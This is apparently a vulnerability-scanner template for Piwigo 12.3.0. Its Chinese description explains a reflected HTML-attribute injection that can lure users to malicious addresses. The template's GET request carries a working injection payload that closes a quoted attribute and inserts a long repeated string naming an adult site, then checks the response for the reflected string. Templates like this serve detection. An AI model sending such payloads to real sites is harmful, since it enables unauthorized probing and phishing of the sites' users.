id: Piwigo-12.3.0

info:
  name: Piwigo-12.3.0 诱骗用户访问
  author: daffainfo
  severity: critical
  description: /search/1940/created-monthly-list 请求参数的值被复制到 HTML 标记属性的值中，该属性封装在双引号中。攻击者可以诱骗用户访问一些精心设计的 URL，该 URL 与该系统完全相连。然后他可以诱骗用户访问一些恶意地址，受害者会根据情况认为这些地址与原始网址相关联。这对该系统的所有用户来说都是危险的。
  reference:
    - https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/Piwigo/2022/12.3.0

set:
  hosturl: request.url
rules:
  r0:
    request:
      method: GET
      path: /index.php?/search/4863/created-monthly-list%22%3Ehttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcomhttps:\pornhubdotcom%3CYZxWX%3E
    expression: response.status == 200 && response.body.bcontains(b'pornhubdotcomhttps')
expression: r0()